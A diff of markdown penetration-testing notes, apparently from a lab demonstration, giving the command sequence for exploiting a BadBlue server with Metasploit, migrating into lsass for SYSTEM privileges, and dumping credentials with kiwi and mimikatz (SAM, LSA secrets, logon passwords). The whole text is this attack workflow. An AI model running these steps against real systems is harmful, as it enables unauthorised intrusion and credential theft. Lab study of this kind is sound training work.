@@ -153,21 +153,33 @@ In this demonstration, we gain access to the target via a meterpreter session, l
 `nmap -sV  [target IP]`
 
 We use metasploit to exploit the specific installed version of badblue:
+
 `service postgresql start && msfconsole`
+
 `search badblue`
+
 `use 1 `
+
 `show options`
+
 `set rhosts [target IP]`
+
 `exploit`
+
 We get a meterpreter session on our target system.
+
 `sysinfo`
+
 `getuid`
 
 `pgrep lsass`: We want to migrate to the lsas.exe process
+
 `migrate xxx`
+
 `getuid`: we should get NT Authority System privilege
 
 ### Kiwi Module (meterpreter extension):
+
 `load kiwi`
 
 example: `creds_all` Gives us credentials all credentials. 
@@ -180,20 +192,29 @@ example: `creds_all` Gives us credentials all credentials.
 ### Mimikatz
 
 still in meterpreter session
-`pwd`
-`cd C:\\`
-`mkdir Temp`
-`cd Temp`
-`upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
-`shell`
-`dir` we have mimikatz here
-`mimikatz.exe`
-`privilege::Debug`check if we have privs; 20 OK
-`lsadump::sam`if we want to dump the cache od lsass process
-`lsadump::secrets`:DUMPING LSASECRETS
-`sekurlsa::logonpasswords`:Display logon passwords, if configured passwords show in clear text when logon
 
-Mimikatz Haous
-Masj
+`pwd`
+
+`cd C:\\`
+
+`mkdir Temp`
+
+`cd Temp`
+
+`upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
+
+`shell`
+
+`dir` we have mimikatz here
+
+`mimikatz.exe`
+
+`privilege::Debug`check if we have privs; 20 OK
+
+`lsadump::sam`if we want to dump the cache od lsass process
+
+`lsadump::secrets`:DUMPING LSASECRETS
+
+`sekurlsa::logonpasswords`:Display logon passwords, if configured passwords show in clear text when logon
 
 
